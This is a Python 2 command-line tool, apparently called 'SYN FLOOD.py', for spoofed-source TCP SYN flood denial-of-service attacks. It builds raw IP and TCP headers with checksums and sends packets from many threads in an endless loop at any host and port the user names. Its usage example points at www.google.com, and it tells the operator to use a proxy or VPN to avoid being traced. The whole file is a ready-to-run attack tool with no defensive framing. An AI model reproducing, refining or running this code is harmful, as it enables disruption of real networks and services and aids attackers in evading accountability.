#!/usr/bin/python


title = """
  _______     ___   _   ______ _      ____   ____  _____                
 / ____\ \   / / \ | | |  ____| |    / __ \ / __ \|  __ \               
| (___  \ \_/ /|  \| | | |__  | |   | |  | | |  | | |  | |  _ __  _   _ 
 \___ \  \   / | . ` | |  __| | |   | |  | | |  | | |  | | | '_ \| | | |
 ____) |  | |  | |\  | | |    | |___| |__| | |__| | |__| | | |_) | |_| |
|_____/   |_|  |_| \_| |_|    |______\____/ \____/|_____/  | .__/ \__, |
                                                           | |     __/ |
                                                           |_|    |___/ v.1.0
                       ___T7hM1___
"""

from random import *
from socket import *
from struct import *
from threading import *
from argparse import ArgumentParser
from termcolor import colored,cprint
import sys,time,os


def checksum(msg):
	s = 0 
	for i in range(0,len(msg),2):
		w = (ord(msg[i]) << 8) + (ord(msg[i+1]))
		s = s+w

	s = (s>>16) + (s & 0xffff)
	s = ~s & 0xffff

	return s

def syn_flood(tgt,prt,spf_ip,ts):
	try:
		sock = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
	except error,e:
		print '[-]',e
		sys.exit()
	sock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)

	ihl=5
	version=4
	tos=0
	tot=40
	id=54321
	frag_off=0
	ttl=255
	protocol=IPPROTO_TCP
	check=10
	s_addr=inet_aton(spf_ip)
	d_addr=inet_aton(tgt)

	ihl_version = (version << 4) + ihl
	ip_header = pack('!BBHHHBBH4s4s',ihl_version,tos,tot,id,frag_off,ttl,protocol,check,s_addr,d_addr)

	source = 1234
	dest = 80
	seq = 0
	ack_seq = 0
	doff = 5
	fin = 0
	syn = 1
	rst = 0
	ack = 0
	psh = 0
	urg = 0
	window = htons(5840)
	check = 0
	urg_prt = 0

	offset_res = (doff << 4)
	tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
	tcp_header=pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,check,urg_prt)

	src_addr = inet_aton(spf_ip)
	dst_addr = inet_aton(tgt)
	place = 0
	protocol = IPPROTO_TCP
	tcp_length = len(tcp_header)

	psh = pack('!4s4sBBH',src_addr,dst_addr,place,protocol,tcp_length);
	psh = psh + tcp_header;

	tcp_checksum = checksum(psh)

	tcp_header = pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,tcp_checksum,urg_prt)
	packet = ip_header + tcp_header
	try: 
		sock.sendto(packet,(tgt,prt))
		screenLock.acquire()
		cprint('---> Sent packet to target','green')
		time.sleep(.3)
	except KeyboardInterrupt:
		sys.exit()
	except Exception,e:
		print '[-]',e
	finally:
		screenLock.release()


def main():
	print colored(title,'red')
	parser = ArgumentParser((sys.argv[0]) + ' -t [target] -i [spoof ip] -p [port] -T [threads]'
		'\nExample: '+(sys.argv[0])+' -t www.google.com -p 80 -T 200')
	parser.add_argument('-t',   '--target',default=False,help='Sepcify your target host')
	parser.add_argument('-i',   '--ip',default='0.0.0.0',help='Set spoof ip(default=0.0.0.0)')
	parser.add_argument('-p',   '--port',default=False,help='Specify target port')
	parser.add_argument('-T',   '--Threads',default=200,help='Set threads for flood')
	args = parser.parse_args()
	if args.target == False and args.port == False:
		parser.print_help()
		sys.exit()
	else:
		permisson = os.getuid()
		if permisson == 0:
			print colored('[+] You have enough permisson to run this script','green')
		else:
			cprint('[-] Required root to run this script','red')
			sys.exit()
		time.sleep(2)
		try:
			cprint('====================SYN FLOOD===================','red','on_green')
			cprint('[!!] Warning,i recommend you to use proxy or vpn to protect yourself','red')
			cprint('[!!] Continue = "ENTER" | Exit = "CTRL+c"','red')
			raw_input("")
		except KeyboardInterrupt:
			sys.exit()
		hst = args.target
		try:
			h = gethostbyname(hst)
		except error,e:
			print '[-]',e
		tgt = h
		prt = int(args.port)
		spf_ip = args.ip
		ts = int(args.Threads)
		global screenLock
		screenLock = Semaphore(value=ts)
		while True:
			for i in range(0,ts):
				try:
					t = Thread(target=syn_flood,args=(tgt,prt,spf_ip,ts))
					t.daemon = True
					t.start()
				except KeyboardInterrupt:
					sys.exit(colored('[-] Canceled by user','red'))

if __name__ == '__main__':
	main()
